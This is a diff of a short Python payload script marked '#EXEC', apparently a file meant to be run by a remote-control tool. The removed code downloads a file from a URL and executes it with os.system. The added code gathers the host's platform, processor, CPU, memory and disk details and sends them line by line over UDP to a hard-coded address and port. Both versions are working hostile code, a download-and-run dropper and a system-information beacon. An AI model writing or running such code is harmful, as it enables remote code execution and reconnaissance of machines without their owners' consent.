@@ -1,42 +1,44 @@
 #EXEC
-import requests
-import os
+import socket
+import platform
+import psutil
+import time
 
-def download_image(url, folder_path):
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            # Save the image with the name 'x.jpg'
-            save_path = os.path.join(folder_path, 'x.jpg')
-            with open(save_path, 'wb') as f:
-                f.write(response.content)
-            return save_path
-        else:
-            print("Failed to download image. Status code:", response.status_code)
-            return None
-    except Exception as e:
-        print("Error occurred while downloading image:", e)
-        return None
+def get_system_info():
+    system_info = {}
+    system_info['Platform'] = platform.platform()
+    system_info['Processor'] = platform.processor()
+    system_info['CPU Usage'] = psutil.cpu_percent()
+    system_info['Memory'] = psutil.virtual_memory().total
+    system_info['Disk'] = psutil.disk_usage('/').total
+    return system_info
 
-def execute_image(image_path):
-    try:
-        os.system(image_path)
-        return True
-    except Exception as e:
-        print("Error occurred while executing image:", e)
-        return False
+def save_system_info(info):
+    with open('info.txt', 'w') as file:
+        for key, value in info.items():
+            file.write(f'{key}: {value}\n')
+
+def send_udp_message(message, ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.sendto(message.encode(), (ip, port))
+    sock.close()
+    print(f"Sent message: {message}")
+
+def main():
+    info = get_system_info()
+    save_system_info(info)
+    ip = '192.168.229.128'  # Change this to the specific IP address
+    port = 16688 # Change this to the specific port
+    while True:
+        with open('info.txt', 'r') as file:
+            for line in file:
+                send_udp_message(line.strip(), ip, port)
+                time.sleep(2)
+            else:
+                break
 
 if __name__ == "__main__":
-    image_url = "https://i.kym-cdn.com/entries/icons/original/000/000/091/TrollFace.jpg"  # Replace with the URL of the image you want to download
-    folder_path = os.path.dirname(os.path.abspath(__file__))  # Get the folder path of the script
-    image_path = download_image(image_url, folder_path)
-    if image_path:
-        print("Image downloaded and saved at:", image_path)
-        if execute_image(image_path):
-            print("Image executed successfully.")
-        else:
-            print("Failed to execute image.")
-    else:
-        print("Failed to download image.")
+    main()
+
 
 
